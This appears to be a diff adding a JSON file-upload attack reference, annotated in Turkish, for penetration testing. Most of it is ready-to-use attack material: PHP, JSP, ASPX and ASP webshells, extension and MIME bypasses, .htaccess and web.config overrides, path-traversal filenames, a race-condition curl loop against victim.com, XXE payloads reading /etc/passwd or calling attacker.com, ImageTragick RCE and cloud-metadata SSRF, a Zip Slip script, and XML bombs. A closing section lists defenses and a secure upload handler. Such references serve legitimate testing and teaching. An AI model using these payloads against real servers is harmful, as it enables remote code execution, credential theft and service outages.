@@ -1,0 +1,613 @@
+{
+  "file_upload_basics": {
+    "desc": "File upload vulnerability temel bilgileri",
+    "category": "File Upload",
+    "type": "Basics",
+    "risk": "Info",
+    "common_vulnerabilities": [
+      "Unrestricted file upload -> RCE",
+      "Insufficient MIME type validation",
+      "Extension blacklist bypass",
+      "Path traversal in filename",
+      "XXE via file upload (SVG, XML, DOCX)",
+      "XSS via file upload (SVG, HTML, PDF)",
+      "SSRF via file upload (DOCX, PDF)"
+    ]
+  },
+
+  "file_upload_rce": {
+    "desc": "File upload ile Remote Code Execution",
+    "category": "File Upload",
+    "type": "RCE",
+    "risk": "Critical",
+    "webshell_uploads": {
+      "php": {
+        "simple": "<?php system($_GET['cmd']); ?>",
+        "advanced": "<?php eval($_POST['c']); ?>",
+        "obfuscated": "<?php @eval($_POST[1]); ?>",
+        "one_liner": "<?=`$_GET[0]`?>",
+        "filename": "shell.php"
+      },
+      "jsp": {
+        "payload": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+        "filename": "shell.jsp"
+      },
+      "aspx": {
+        "payload": "<%@ Page Language=\"C#\" %>\n<% Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request.QueryString[\"cmd\"]).StandardOutput.ReadToEnd()); %>",
+        "filename": "shell.aspx"
+      },
+      "asp": {
+        "payload": "<%eval request(\"cmd\")%>",
+        "filename": "shell.asp"
+      }
+    },
+    "upload_locations": {
+      "desc": "Upload edilen dosyanın nerede çalıştırılabileceğini bul",
+      "common_paths": [
+        "/uploads/",
+        "/files/",
+        "/images/",
+        "/media/",
+        "/assets/",
+        "/tmp/",
+        "/var/www/html/uploads/"
+      ],
+      "discovery": "Upload yaptıktan sonra response'da path var mı? Bruteforce ile path bul."
+    }
+  },
+
+  "file_upload_extension_bypass": {
+    "desc": "File extension filter bypass",
+    "category": "File Upload",
+    "type": "Extension Bypass",
+    "risk": "Critical",
+    "techniques": [
+      {
+        "name": "Double extension",
+        "desc": "Server sadece son extension'a bakıyorsa",
+        "examples": [
+          "shell.php.jpg",
+          "shell.php.png",
+          "shell.php.pdf",
+          "shell.jpg.php",
+          "shell.php.txt"
+        ],
+        "note": "Bazı server'lar .php.jpg dosyasını PHP olarak execute eder"
+      },
+      {
+        "name": "Null byte injection",
+        "desc": "Null byte ile extension truncate etme (PHP < 5.3.4)",
+        "examples": [
+          "shell.php%00.jpg",
+          "shell.php\\x00.png",
+          "shell.php%00.txt"
+        ],
+        "note": "PHP < 5.3.4'te null byte sonrası ignore edilir: shell.php%00.jpg -> shell.php"
+      },
+      {
+        "name": "Case sensitivity bypass",
+        "desc": "Extension blacklist case-sensitive ise",
+        "examples": [
+          "shell.PhP",
+          "shell.pHp",
+          "shell.PHP",
+          "shell.Php"
+        ]
+      },
+      {
+        "name": "Trailing spaces/dots",
+        "desc": "Windows trailing space/dot ignore eder",
+        "examples": [
+          "shell.php.",
+          "shell.php ",
+          "shell.php.........",
+          "shell.php%20",
+          "shell.php::$DATA (Windows NTFS ADS)"
+        ],
+        "note": "Windows: test.php. -> test.php olarak kaydedilir"
+      },
+      {
+        "name": "Alternative extensions",
+        "desc": "PHP için alternatif extension'lar",
+        "php_extensions": [
+          ".php",
+          ".php3",
+          ".php4",
+          ".php5",
+          ".php7",
+          ".phtml",
+          ".phar",
+          ".phpt",
+          ".pgif",
+          ".pht",
+          ".inc"
+        ],
+        "asp_extensions": [
+          ".asp",
+          ".aspx",
+          ".cer",
+          ".asa",
+          ".asax",
+          ".ascx",
+          ".ashx",
+          ".asmx",
+          ".axd"
+        ],
+        "jsp_extensions": [
+          ".jsp",
+          ".jspx",
+          ".jsw",
+          ".jsv",
+          ".jspf"
+        ]
+      },
+      {
+        "name": "htaccess upload",
+        "desc": ".htaccess ile tüm dosyaları PHP olarak execute ettir",
+        "payload": "AddType application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .jpg",
+        "usage": "1. .htaccess upload et\n2. shell.jpg upload et\n3. shell.jpg PHP olarak execute edilir",
+        "filename": ".htaccess"
+      },
+      {
+        "name": "web.config upload (IIS)",
+        "desc": "IIS'de .jpg dosyalarını ASP olarak execute ettir",
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n  <system.webServer>\n    <handlers>\n      <add name=\"jpg_handler\" path=\"*.jpg\" verb=\"*\" type=\"ASPClassicHandler\" resourceType=\"Unspecified\" />\n    </handlers>\n  </system.webServer>\n</configuration>",
+        "filename": "web.config"
+      }
+    ]
+  },
+
+  "file_upload_mime_type_bypass": {
+    "desc": "MIME type validation bypass",
+    "category": "File Upload",
+    "type": "MIME Bypass",
+    "risk": "High",
+    "techniques": [
+      {
+        "name": "Content-Type header manipulation",
+        "desc": "Content-Type header'ı değiştir",
+        "example": "Content-Type: image/jpeg\n\n(ama dosya içeriği PHP webshell)",
+        "burp_modification": "Content-Type: image/jpeg\nContent-Type: image/png\nContent-Type: image/gif"
+      },
+      {
+        "name": "Magic bytes (file signature) spoofing",
+        "desc": "Dosyanın ilk byte'larına image magic bytes ekle",
+        "gif_header": "GIF89a; + PHP code",
+        "jpg_header": "\\xFF\\xD8\\xFF\\xE0 + PHP code",
+        "png_header": "\\x89PNG\\r\\n\\x1a\\n + PHP code",
+        "example_php_webshell": "GIF89a;\n<?php system($_GET['cmd']); ?>",
+        "filename": "shell.php (GIF header ile başlar ama PHP execute edilir)"
+      },
+      {
+        "name": "Polyglot files",
+        "desc": "Hem valid image hem de executable code",
+        "example": "Valid JPEG + PHP code embedded in EXIF/comment",
+        "tool": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg"
+      }
+    ]
+  },
+
+  "file_upload_path_traversal": {
+    "desc": "Path traversal via filename",
+    "category": "File Upload",
+    "type": "Path Traversal",
+    "risk": "Critical",
+    "payloads": [
+      {
+        "filename": "../../shell.php",
+        "desc": "Upload path'ten çık, root'a webshell yaz"
+      },
+      {
+        "filename": "....//....//shell.php",
+        "desc": "Nested path traversal"
+      },
+      {
+        "filename": "..%2f..%2fshell.php",
+        "desc": "URL encoded path traversal"
+      },
+      {
+        "filename": "..\\..\\shell.php",
+        "desc": "Windows path traversal"
+      },
+      {
+        "filename": "/var/www/html/shell.php",
+        "desc": "Absolute path (eğer izin varsa)"
+      },
+      {
+        "filename": "../../../etc/cron.d/reverse-shell",
+        "desc": "Cron job ile privilege escalation"
+      }
+    ],
+    "exploitation": {
+      "scenario": "Upload path: /var/www/html/uploads/\nFilename: ../../../../var/www/html/shell.php\nSonuç: /var/www/html/shell.php (webroot'ta!)"
+    }
+  },
+
+  "file_upload_race_condition": {
+    "desc": "File upload race condition",
+    "category": "File Upload",
+    "type": "Race Condition",
+    "risk": "High",
+    "vulnerability": {
+      "desc": "Server dosyayı upload ediyor, validate ediyor, sonra siliyor. Validation öncesi execute edebilir misin?",
+      "flow": "1. Upload shell.php\n2. Server temp path'e yazar\n3. Server validate eder (malicious!)\n4. Server siler\n\nRace: 2 ile 4 arası shell.php'yi execute et!"
+    },
+    "exploitation": {
+      "script": "#!/bin/bash\n# Terminal 1: Upload loop\nwhile true; do\n  curl -X POST -F 'file=@shell.php' https://victim.com/upload\ndone\n\n# Terminal 2: Execute loop\nwhile true; do\n  curl https://victim.com/uploads/shell.php?cmd=whoami\ndone",
+      "note": "Birkaç saniye içinde shell execute edilebilir"
+    }
+  },
+
+  "file_upload_xxe_injection": {
+    "desc": "XXE via file upload (SVG, XML, DOCX, XLSX)",
+    "category": "File Upload",
+    "type": "XXE",
+    "risk": "Critical",
+    "svg_xxe": {
+      "desc": "SVG dosyası ile XXE",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text x=\"0\" y=\"50\" font-size=\"20\">&xxe;</text>\n</svg>",
+      "filename": "exploit.svg",
+      "usage": "SVG upload -> server parse ederse /etc/passwd leak olur"
+    },
+    "docx_xxe": {
+      "desc": "DOCX dosyası ile XXE (DOCX = ZIP + XML)",
+      "steps": [
+        "1. Normal .docx dosyası aç (unzip)",
+        "2. word/document.xml düzenle, XXE payload ekle",
+        "3. Zip'le tekrar .docx yap",
+        "4. Upload et"
+      ],
+      "payload_in_document_xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://attacker.com/exfil.php\">\n]>\n<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n  <w:body>\n    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>\n  </w:body>\n</w:document>"
+    }
+  },
+
+  "file_upload_xss": {
+    "desc": "XSS via file upload",
+    "category": "File Upload",
+    "type": "XSS",
+    "risk": "High",
+    "techniques": [
+      {
+        "name": "SVG XSS",
+        "desc": "SVG dosyası JavaScript içerebilir",
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" />\n</svg>",
+        "filename": "xss.svg",
+        "impact": "Victim dosyayı açarsa XSS execute olur"
+      },
+      {
+        "name": "HTML file upload",
+        "desc": "HTML dosyası upload et",
+        "payload": "<!DOCTYPE html>\n<html>\n<body>\n<script>alert(document.cookie)</script>\n</body>\n</html>",
+        "filename": "xss.html",
+        "note": "Same-origin policy: victim.com/uploads/xss.html victim.com cookie'lerine erişebilir"
+      },
+      {
+        "name": "PDF XSS",
+        "desc": "PDF içine JavaScript embed et",
+        "tool": "PDFtk, custom PDF generation",
+        "payload": "PDF with embedded JavaScript action"
+      },
+      {
+        "name": "Filename XSS",
+        "desc": "Filename'de XSS payload",
+        "payloads": [
+          "<script>alert(1)</script>.jpg",
+          "\"><img src=x onerror=alert(1)>.png",
+          "test'><svg/onload=alert(document.domain)>.gif"
+        ],
+        "scenario": "Server filename'i sanitize etmeden HTML'de gösterirse XSS"
+      }
+    ]
+  },
+
+  "file_upload_ssrf": {
+    "desc": "SSRF via file upload",
+    "category": "File Upload",
+    "type": "SSRF",
+    "risk": "High",
+    "techniques": [
+      {
+        "name": "ImageTragick (ImageMagick RCE/SSRF)",
+        "desc": "ImageMagick MVG format ile SSRF/RCE",
+        "payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)'\npop graphic-context",
+        "filename": "exploit.mvg",
+        "reference": "CVE-2016-3714"
+      },
+      {
+        "name": "XXE SSRF via SVG",
+        "desc": "SVG ile internal network tarama",
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text x=\"0\" y=\"50\">&xxe;</text>\n</svg>"
+      }
+    ]
+  },
+
+  "file_upload_dos": {
+    "desc": "DoS via file upload",
+    "category": "File Upload",
+    "type": "DoS",
+    "risk": "Medium",
+    "attacks": [
+      {
+        "name": "ZIP bomb",
+        "desc": "Küçük ZIP dosyası, extract edilince GB'larca yer kaplar",
+        "example": "42.zip - 42KB ZIP, extract edilince 4.5PB!",
+        "impact": "Server disk space tükenir"
+      },
+      {
+        "name": "XML bomb (Billion Laughs)",
+        "desc": "SVG/XML ile billion laughs attack",
+        "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&lol4;</text>\n</svg>"
+      },
+      {
+        "name": "Large file upload",
+        "desc": "Çok büyük dosya upload et, disk/memory tüket",
+        "example": "10GB dosya upload et"
+      },
+      {
+        "name": "Pixel flood (decompression bomb)",
+        "desc": "Küçük image, parse edilince çok memory tüketir",
+        "example": "1x1 pixel 1GB memory tüketebilir (craft edilmiş BMP/PNG)"
+      }
+    ]
+  },
+
+  "file_upload_polyglot_files": {
+    "desc": "Polyglot files - multiple format combination",
+    "category": "File Upload",
+    "type": "Polyglot",
+    "risk": "High",
+    "examples": [
+      {
+        "name": "GIFAR (GIF + JAR)",
+        "desc": "Hem valid GIF hem valid JAR",
+        "usage": "Image olarak upload, ama Java applet olarak execute"
+      },
+      {
+        "name": "PHAR polyglot",
+        "desc": "PHAR + JPEG",
+        "payload": "Valid JPEG + embedded PHAR (PHP Archive)",
+        "exploitation": "PHP unserialize via phar:// wrapper"
+      },
+      {
+        "name": "PDF + JavaScript + HTML",
+        "desc": "PDF reader'da JS execute, browser'da HTML parse",
+        "usage": "Multi-context exploitation"
+      },
+      {
+        "name": "JPEG + PHP",
+        "desc": "Valid JPEG ama PHP code embedded",
+        "creation": "exiftool -Comment='<?php system($_GET[\"c\"]); ?>' image.jpg -o shell.jpg",
+        "usage": "LFI ile include: include($_GET['file']); -> ?file=uploads/shell.jpg"
+      }
+    ]
+  },
+
+  "file_upload_metadata_exploitation": {
+    "desc": "File metadata exploitation",
+    "category": "File Upload",
+    "type": "Metadata",
+    "risk": "Medium",
+    "exif_injection": {
+      "desc": "EXIF metadata'ya payload inject etme",
+      "xss_payload": "exiftool -Comment='<script>alert(origin)</script>' image.jpg",
+      "sqli_payload": "exiftool -Comment=\"' OR 1=1--\" image.jpg",
+      "usage": "Server EXIF parse edip gösteriyorsa XSS/SQLi mümkün"
+    },
+    "exiftool_rce": {
+      "desc": "ExifTool < 12.38 RCE (CVE-2021-22204)",
+      "payload": "Craft edilmiş EXIF metadata ile RCE",
+      "tool": "exploit-CVE-2021-22204.py",
+      "reference": "CVE-2021-22204"
+    }
+  },
+
+  "file_upload_filename_tricks": {
+    "desc": "Filename manipulation tricks",
+    "category": "File Upload",
+    "type": "Filename Tricks",
+    "risk": "High",
+    "techniques": [
+      {
+        "name": "Long filename DoS",
+        "payload": "AAAAAAAAAA...(10000 characters)...AAAAAAAAAA.jpg",
+        "desc": "10000 karakter uzunluğunda 'A' harfi + .jpg uzantısı",
+        "impact": "Filename too long, server crash veya error"
+      },
+      {
+        "name": "Unicode normalization",
+        "desc": "Unicode karakterlerle bypass",
+        "examples": [
+          "shell\u202ephp.jpg (U+202E Right-to-Left Override)",
+          "shell\u0000.jpg (null byte)",
+          "shell\uFEFF.php (Zero-width no-break space)"
+        ]
+      },
+      {
+        "name": "Special characters",
+        "desc": "Filename'de special chars",
+        "examples": [
+          "shell;.php",
+          "shell|whoami.php",
+          "shell`whoami`.php",
+          "shell$(whoami).php"
+        ],
+        "note": "Server filename'i shell'de kullanırsa command injection"
+      },
+      {
+        "name": "Overwrite important files",
+        "desc": "Critical dosyaları overwrite et",
+        "targets": [
+          "../../.htaccess",
+          "../../../index.php",
+          "../../config.php",
+          "/etc/passwd (eğer permission varsa)"
+        ]
+      }
+    ]
+  },
+
+  "file_upload_imagemagick_exploits": {
+    "desc": "ImageMagick exploitation (ImageTragick)",
+    "category": "File Upload",
+    "type": "ImageMagick",
+    "risk": "Critical",
+    "cve_2016_3714": {
+      "desc": "ImageTragick - RCE via MVG/SVG",
+      "rce_payload": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://attacker.com/shell.php?`whoami > /tmp/output.txt`'\npop graphic-context",
+      "filename": "exploit.mvg"
+    },
+    "ssrf_payload": {
+      "desc": "SSRF via ImageMagick",
+      "payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(http://169.254.169.254/latest/meta-data/)'\npop graphic-context",
+      "filename": "ssrf.mvg"
+    },
+    "file_read": {
+      "desc": "Local file read via ImageMagick",
+      "payload": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'label:@/etc/passwd'\npop graphic-context"
+    }
+  },
+
+  "file_upload_zip_slip": {
+    "desc": "Zip Slip vulnerability - path traversal in ZIP files",
+    "category": "File Upload",
+    "type": "Zip Slip",
+    "risk": "Critical",
+    "vulnerability": {
+      "desc": "ZIP dosyası extract edilirken path traversal",
+      "scenario": "ZIP içindeki dosya: ../../../../var/www/html/shell.php\nExtract edilince: /var/www/html/shell.php (webroot!)"
+    },
+    "exploitation": {
+      "create_malicious_zip": "import zipfile\nz = zipfile.ZipFile('exploit.zip', 'w')\nz.write('shell.php', '../../../../var/www/html/shell.php')\nz.close()",
+      "impact": "Arbitrary file write, RCE"
+    },
+    "reference": "CVE-2018-1000117"
+  },
+
+  "file_upload_testing_checklist": {
+    "desc": "File upload penetration testing checklist",
+    "category": "File Upload",
+    "type": "Testing",
+    "checklist": [
+      "Try uploading PHP/JSP/ASPX webshell",
+      "Test extension bypass (double ext, null byte, case, spaces, htaccess)",
+      "Test MIME type bypass (Content-Type, magic bytes)",
+      "Test path traversal in filename",
+      "Upload SVG with XXE/XSS payload",
+      "Upload HTML file with XSS",
+      "Test race condition (upload -> execute -> delete)",
+      "Try overwriting .htaccess or web.config",
+      "Upload ZIP file with path traversal (Zip Slip)",
+      "Test ImageMagick exploits (MVG/SVG)",
+      "Upload polyglot files (JPEG+PHP)",
+      "Test EXIF injection",
+      "Try ZIP bomb for DoS",
+      "Check file size limit (DoS)",
+      "Test filename tricks (long name, special chars, unicode)",
+      "Look for temp file path disclosure"
+    ],
+    "tools": [
+      "Burp Suite",
+      "Upload Scanner (Burp extension)",
+      "fuxploider",
+      "ExifTool",
+      "ImageMagick identify (test parsing)"
+    ]
+  },
+
+  "file_upload_bypasses_summary": {
+    "desc": "Quick reference - all bypass techniques",
+    "category": "File Upload",
+    "type": "Quick Reference",
+    "extension_bypasses": [
+      "shell.php.jpg",
+      "shell.php%00.jpg",
+      "shell.PhP",
+      "shell.php.",
+      "shell.php%20",
+      "shell.php::$DATA",
+      "shell.phtml / .php5 / .phar",
+      ".htaccess upload"
+    ],
+    "mime_bypasses": [
+      "Change Content-Type: image/jpeg",
+      "Add GIF89a; header",
+      "Add JPEG magic bytes: \\xFF\\xD8\\xFF",
+      "Polyglot: valid image + PHP code"
+    ],
+    "content_bypasses": [
+      "Magic bytes in first line",
+      "EXIF comment injection",
+      "Polyglot files",
+      "ZIP with malicious content"
+    ],
+    "advanced_bypasses": [
+      "Path traversal: ../../shell.php",
+      "Race condition: upload + execute fast",
+      "XXE via SVG/DOCX",
+      "ImageMagick RCE",
+      "Zip Slip",
+      "Filename command injection"
+    ]
+  },
+
+  "file_upload_defense": {
+    "desc": "File upload security best practices",
+    "category": "File Upload",
+    "type": "Defense",
+    "best_practices": [
+      {
+        "rule": "Whitelist allowed extensions",
+        "implementation": "allowed = ['.jpg', '.png', '.gif']\nif file_ext not in allowed: reject()",
+        "avoid": "Blacklist (çok fazla bypass var)"
+      },
+      {
+        "rule": "Validate MIME type + magic bytes",
+        "check": "Content-Type header + file içeriğinin ilk byte'ları",
+        "note": "İkisini birden kontrol et"
+      },
+      {
+        "rule": "Rename uploaded files",
+        "implementation": "filename = uuid4() + '.jpg'",
+        "reason": "Path traversal ve filename injection önlenir"
+      },
+      {
+        "rule": "Store outside webroot",
+        "avoid": "/var/www/html/uploads/",
+        "use": "/var/uploads/ (webroot dışında)",
+        "serve": "Ayrı script ile serve et, direct access yok"
+      },
+      {
+        "rule": "File size limit",
+        "implementation": "MAX_SIZE = 5MB",
+        "reason": "DoS ve disk exhaustion önlenir"
+      },
+      {
+        "rule": "Disable execution in upload directory",
+        "htaccess": "php_flag engine off",
+        "nginx": "location /uploads { deny all; }",
+        "reason": "Webshell execute edilemez"
+      },
+      {
+        "rule": "Scan with antivirus",
+        "tool": "ClamAV integration",
+        "note": "Upload'tan sonra virus scan yap"
+      },
+      {
+        "rule": "Process images",
+        "implementation": "ImageMagick/GD ile image'i re-encode et",
+        "reason": "Embedded payload'lar temizlenir"
+      },
+      {
+        "rule": "Content Security Policy",
+        "header": "Content-Security-Policy: default-src 'none'",
+        "reason": "XSS via uploaded HTML önlenir"
+      },
+      {
+        "rule": "Random subdomain for user content",
+        "example": "user-content-abc123.victim.com",
+        "reason": "Same-origin isolation"
+      }
+    ],
+    "secure_php_implementation": "<?php\n// 1. File size check\nif ($_FILES['file']['size'] > 5 * 1024 * 1024) {\n  die('File too large');\n}\n\n// 2. Extension whitelist\n$allowed_ext = ['jpg', 'png', 'gif'];\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_ext)) {\n  die('Invalid extension');\n}\n\n// 3. MIME type check\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\n$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];\nif (!in_array($mime, $allowed_mime)) {\n  die('Invalid MIME type');\n}\n\n// 4. Magic bytes check\n$handle = fopen($_FILES['file']['tmp_name'], 'r');\n$header = fread($handle, 4);\nfclose($handle);\n$valid = false;\nif (substr($header, 0, 3) === \"\\xFF\\xD8\\xFF\") $valid = true; // JPEG\nif (substr($header, 0, 4) === \"\\x89PNG\") $valid = true; // PNG\nif (substr($header, 0, 3) === \"GIF\") $valid = true; // GIF\nif (!$valid) die('Invalid file signature');\n\n// 5. Rename file (UUID)\n$new_filename = uniqid('img_', true) . '.' . $ext;\n\n// 6. Upload outside webroot\n$upload_dir = '/var/uploads/'; // NOT in /var/www/html\n$upload_path = $upload_dir . $new_filename;\n\n// 7. Move file\nif (!move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {\n  die('Upload failed');\n}\n\n// 8. Re-encode image (remove embedded payloads)\n$image = imagecreatefromstring(file_get_contents($upload_path));\nimagejpeg($image, $upload_path, 90);\nimagedestroy($image);\n\necho 'File uploaded successfully: ' . htmlspecialchars($new_filename);\n?>"
+  }
+}
